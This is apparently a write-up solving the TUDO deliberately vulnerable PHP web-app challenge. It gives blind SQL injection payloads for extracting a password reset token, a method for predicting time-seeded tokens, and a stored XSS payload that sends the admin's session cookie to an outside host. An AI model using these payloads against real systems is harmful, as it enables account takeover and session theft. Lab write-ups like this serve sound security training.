## TUDO (Vulnerable PHP Web-App)

https://github.com/bmdyy/tudo

### First Access

To get first access on this challenge, you have two options:
* Explore SQL injection on forgotUsername.php to get password resetToken;
* Create a list with every possible value for this token since you have the seed on utils.php.

<br>

#### SQL Injection
The SQL injection is automated on SQLinjection.py. First you discover user UID with this payload:
 ```
admin' and (select uid from users where username='user1')='%s
```

You can discover that the uid is necessarily based on this line on **forgotpassword.php**:
```
$ret = pg_prepare($db, "createtoken_query", "insert into tokens (uid, token) values ($1, $2)");
```

Now you can extract resetToken with:
```
admin' and (select ascii(substr(token,%s,1)) from tokens where uid=%s limit 1)='%s
```

For some reason you have to compare the character in ascii decimal value.

<br>

#### Predicting Token
The original function to generate token is:
```php
function generateToken() {
        srand(round(microtime(true) * 1000));
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
        $ret = '';
        for ($i = 0; $i < 32; $i++) {
            $ret .= $chars[rand(0,strlen($chars)-1)];
        }
        return $ret;
    }
```

We can create a php file to generate a list for the possible tokens:
```php
<?php

  function generateToken($seed){
      ...
}

	$t_start = $argv[1];
	$t_end   = $argv[2];

	for ($i = $t_start; $i < $t_end; $i++) {
		print_r(generateToken($i) . "\n");
	}
?>
```

This will receive two values from the script that are related to timestamps, since the main function uses microtime.

Now we can create the script **generateTokens.py** to get this possible values and interact with **resetpassword.php** until it finds the correct one.

<br>

### Privilege Escalation
The privilege escalation is based on a XSS on profile description. This will be reflected in the admin page and we may steal your session cookie.

This is the payload and the process is automated on **stealCookie.pyp**:
```
<script>document.write('<img src=http://192.168.159.131:9000/'+document.cookie+' />');</script>
```

On index.php, you can see the difference between on content being sanitize and this vulnerable one not.
```php
# Vulnerable
echo '<td>'.$row[3].'</td>';

# Sanitized
echo '<td><i>'.htmlentities($row[1]).'</i></td>';
```
